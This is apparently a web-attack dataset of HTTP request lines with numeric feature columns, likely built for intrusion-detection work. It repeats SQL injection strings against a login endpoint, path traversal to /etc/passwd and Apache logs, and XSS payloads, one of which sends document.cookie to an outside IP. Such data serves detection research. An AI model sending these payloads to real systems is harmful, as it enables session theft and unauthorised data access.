32,1,200,3374,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4343,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7690,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3933,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7485,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4492,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5168,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4496,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6353,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4530,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7200,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4526,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1591,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4515,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7500,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2684,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3018,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7721,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2698,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3425,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6311,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4671,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1627,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7800,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1068,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1432,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3551,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,6643,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3677,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1754,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7383,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1583,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4857,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5661,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,5045,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,3480,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,1007,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7902,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,2451,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7150,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,4737,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
32,1,200,7869,7,9,6,2,1,GET login/?id=' or 1=1# HTTP/1.1
76,1,200,6655,7,28,17,6,2,GET /?p=<script><script+src="http://3.27.22.31/642664.js=></script> HTTP/1.1
49,1,200,5181,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6790,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4207,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,6791,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2860,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3061,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2647,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3041,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3295,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,7804,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2737,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4740,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,4597,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,7501,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3838,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,3528,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
49,1,200,2486,7,20,12,6,3,GET main.cgi?file=../../../../etc/passwd HTTP/1.1
47,1,200,5947,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,2756,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,3872,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,6962,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,2423,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,1148,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,6011,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,3466,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,6071,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,7016,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,5900,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
47,1,200,2207,7,19,10,7,3,GET ../../../../apache/logs/access.log HTTP/1.1
84,1,200,3555,8,32,16,6,2,GET /?search=<script>%window.open('http://222.164.150.48/701898')3C/script> HTTP/1.1
75,2,200,2047,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3227,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4104,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6424,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4732,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3597,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4239,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6162,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7028,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2336,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1186,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7275,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1012,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5511,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5986,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5921,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3997,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7700,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4327,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2573,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6922,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2752,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1063,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6549,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3159,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4750,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7559,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1001,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6866,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6553,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1879,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4053,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2224,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7181,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1375,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7361,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6311,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6946,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5943,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2314,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1997,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2543,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4144,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2517,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4996,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,6476,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5132,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4178,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2714,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2432,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3664,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1458,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7669,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1713,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3398,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2062,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4016,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,7408,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,2134,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3151,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,3172,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5106,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,5796,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4128,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,1522,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
75,2,200,4796,24,24,13,2,1,GET login/?id=SELECT * FROM members WHERE '1'='1' --&Submit=Submit HTTP/1.1
98,1,200,6466,7,51,19,6,2,GET /?p=<script>window.location='http://239.246.234.36/?cookie='+document.cookie</script> HTTP/1.1
61,1,200,4602,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1110,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,3120,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1019,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,4195,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,6056,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1097,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2290,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,1825,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2561,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2995,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,7065,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,7103,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
61,1,200,2247,7,30,13,7,3,GET get-files?file=../../../../apache/logs/error.log HTTP/1.1
78,1,200,6520,8,27,16,6,2,GET /?p=<script>%window.open('http://9.223.250.164/423056')3C/script> HTTP/1.1
81,1,200,3078,7,38,14,5,2,GET /?name=<script>window.location.href="http://13.143.136.220"</script> HTTP/1.1
61,1,200,7512,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1167,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1578,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1441,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,6942,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7198,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1111,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1355,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,3118,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4049,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,3708,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,2788,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,5643,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1207,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1842,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7944,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,5965,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7154,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,4505,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,3063,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,1584,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
61,1,200,7418,7,30,13,7,3,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1
53,2,200,5327,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5849,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7558,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7454,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7428,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4211,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7737,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7596,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4531,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5869,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4734,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6913,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4708,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1873,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3355,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4107,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4910,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4191,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4632,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6227,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4355,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4098,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4339,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6514,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5264,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,7543,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1331,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4043,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6892,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6503,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3167,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1201,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,1000,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2655,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2064,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2611,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4146,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3407,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6538,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3272,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,5834,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,3940,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4056,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2687,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,2396,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,4725,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
53,2,200,6210,9,19,9,2,2,GET login/?id=27 or 1 = 1; -- &Submit=Submit HTTP/1.1
